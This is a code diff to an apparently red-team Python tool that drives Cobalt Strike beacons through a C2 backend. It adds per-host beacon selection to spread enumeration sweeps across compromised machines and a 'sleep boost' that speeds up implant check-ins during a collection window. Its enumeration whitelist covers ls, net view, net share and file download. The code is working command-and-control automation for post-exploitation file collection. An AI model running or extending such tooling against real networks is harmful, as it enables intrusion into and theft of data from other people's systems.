@@ -577,8 +577,83 @@ def pick_beacon(backend: Any, preferred: str = "") -> str:
     return m.group(1)
 
 
+def _parse_beacons(text: str) -> list[tuple[str, str]]:
+    """[(beacon_id, description)] from cs_list_beacons output."""
+    out = []
+    for line in text.splitlines():
+        if _is_decoration(line):
+            continue
+        m = _RECEIPT_ID_RE.search(line)
+        if m:
+            out.append((m.group(1), line))
+    return out
+
+
+class BeaconChooser:
+    """Per-host beacon selection:
+
+    * ``affinity`` — when the target hostname appears in a beacon's
+      description, that beacon owns the host (it IS that machine or sits
+      closest to it); otherwise round-robin across beacons so hosts
+      spread out and sweep in parallel through multiple check-ins.
+    * explicit beacon id / first beacon — as before.
+    """
+
+    def __init__(self, beacons: list[tuple[str, str]], mode: str = "affinity"):
+        self.beacons = beacons or []
+        self.mode = mode if beacons else "first"
+        self._rr = 0
+        self._lock = threading.Lock()
+
+    def pick(self, host: str) -> str:
+        with self._lock:
+            if not self.beacons:
+                raise CSCommandError("no beacons available")
+            if self.mode in ("", "first", "auto"):
+                return self.beacons[0][0]
+            if self.mode not in ("affinity", "round-robin"):
+                return self.mode          # explicit beacon id
+            low = host.lower()
+            short = low.split(".")[0]
+            for bid, desc in self.beacons:
+                d = desc.lower()
+                # full host or its short label (dev01.corp.local vs DEV01)
+                if low in d or (short and
+                                re.search(rf"\b{re.escape(short)}\b", d)):
+                    return bid
+            if self.mode == "affinity" or len(self.beacons) == 1:
+                bid = self.beacons[self._rr % len(self.beacons)][0]
+                self._rr += 1
+                return bid
+            bid = self.beacons[self._rr % len(self.beacons)][0]
+            self._rr += 1
+            return bid
+
+
+def _apply_sleep(backend: Any, beacon: str, spec: str) -> None:
+    """Submit a `sleep <delay> <jitter>` C2-hygiene command directly.
+
+    These are OPERATIONAL commands about the beacon itself, not target
+    actions — so they bypass the enumeration whitelist (which stays pure:
+    ls / net view / net share / download only)."""
+    names = CS_ARG_NAMES["execute"]
+    backend.call("cs_execute_command",
+                 {names["beacon"]: beacon,
+                  names["command"]: f"sleep {spec}"})
+
+
 def arm_cs_transport(policy) -> None:
-    """Build ONE shared backend+beacon for the run and arm the factory."""
+    """Build ONE shared backend for the run and arm the factory.
+
+    Beacon selection (policy cs_beacon): explicit id, "first"/"auto"
+    (default), or "affinity"/"round-robin" (per-host choice across the
+    beacons cs_list_beacons reports).
+
+    Sleep boost (policy cs_sleep_boost, "<boost>:<restore>" e.g.
+    "5 50:60 50"): submit `sleep <boost>` on arm and `sleep <restore>` on
+    disarm — the collection window runs with fast check-ins, the sweep's
+    end restores the operational cadence. Explicit opt-in, off by default.
+    """
     from .smb_session import arm_transport
     url = str(getattr(policy, "cs_mcp_url", "") or "").strip()
     if not url:
@@ -587,11 +662,30 @@ def arm_cs_transport(policy) -> None:
     backend = RealCSBackend(url=url,
                             token=str(getattr(policy, "cs_mcp_token", "")
                                       or ""))
-    beacon = pick_beacon(backend, str(getattr(policy, "cs_beacon", "") or ""))
+    mode = str(getattr(policy, "cs_beacon", "") or "")
+    chooser = BeaconChooser(_parse_beacons(backend.call("cs_list_beacons",
+                                                        {})),
+                            mode=mode or "first")
     deadline = float(getattr(policy, "cs_deadline_minutes", 30)) * 60
 
+    boost = str(getattr(policy, "cs_sleep_boost", "") or "")
+    restore = ""
+    if boost:
+        boost, _, restore = boost.partition(":")
+        for bid, _desc in chooser.beacons:      # boost EVERY beacon in use
+            _apply_sleep(backend, bid, boost)
+
+    def closer() -> None:
+        if restore:
+            for bid, _desc in chooser.beacons:
+                try:
+                    _apply_sleep(backend, bid, restore)
+                except Exception:  # noqa: BLE001 — best-effort on teardown
+                    pass
+        backend.close()
+
     def provider(host: str) -> EnumerationTransport:
-        return CobaltStrikeTransport(backend, beacon, host,
+        return CobaltStrikeTransport(backend, chooser.pick(host), host,
                                      deadline_seconds=deadline)
 
-    arm_transport(provider, closer=backend.close)
+    arm_transport(provider, closer=closer)
